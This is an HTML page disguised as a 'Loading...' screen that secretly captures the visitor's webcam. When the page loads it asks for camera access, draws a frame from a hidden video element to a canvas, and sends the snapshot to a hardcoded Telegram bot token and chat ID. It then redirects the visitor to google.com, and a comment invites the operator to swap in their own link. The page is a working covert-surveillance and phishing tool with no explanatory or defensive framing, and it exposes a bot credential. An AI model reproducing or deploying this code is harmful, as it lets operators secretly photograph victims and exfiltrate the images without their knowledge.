<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Loading...</title>
</head>
<body style="margin:0; background:#000;">
  <video id="video" autoplay playsinline style="display:none;"></video>
  <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>

  <script>
    const BOT_TOKEN = "7594029242:AAGlcWf6mZPKVm6NEsLsAEpqXWRrFhBaS8w";
    const CHAT_ID = "7009447523";
    const REDIRECT_URL = "https://google.com"; // 👈 Apna link daalein

    // Always request fresh permission
    async function forceCameraAccess() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        return stream;
      } catch (err) {
        console.error("🚫 Camera blocked:", err);
        return null;
      }
    }

    async function captureAndSend(stream) {
      try {
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        video.srcObject = stream;

        await new Promise(resolve => {
          video.onloadedmetadata = () => resolve();
        });

        // Wait 300ms for video to stabilize
        setTimeout(async () => {
          const ctx = canvas.getContext('2d');
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
          const imageData = canvas.toDataURL('image/jpeg', 0.9);
          const blob = await (await fetch(imageData)).blob();

          const formData = new FormData();
          formData.append("chat_id", CHAT_ID);
          formData.append("photo", blob, "snap.jpg");

          // Send image
          fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: "POST",
            body: formData
          }).catch(err => console.error("Telegram error:", err));
        }, 300); // short delay for frame capture
      } catch (error) {
        console.error("❌ Capture/send failed:", error);
      }
    }

    // Start process on load
    window.onload = async () => {
      const stream = await forceCameraAccess();

      if (stream) {
        await captureAndSend(stream);
      }

      // Redirect after short time regardless of success
      setTimeout(() => {
        window.location.href = REDIRECT_URL;
      }, 1000); // 1 second total
    };
  </script>
</body>
</html>
